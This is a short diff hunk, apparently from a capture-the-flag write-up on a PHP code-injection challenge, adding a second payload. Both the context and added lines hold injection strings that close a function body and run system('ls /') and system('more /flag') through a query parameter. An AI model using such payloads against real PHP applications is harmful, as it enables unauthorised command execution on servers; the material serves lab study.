@@ -1387,4 +1387,7 @@ function lambda1($a,$b){
 
 ?name=){}system('ls /');/*&value=Leaf&
 
+
+//第二个参数
+root=}system('more /flag');/*
 ```
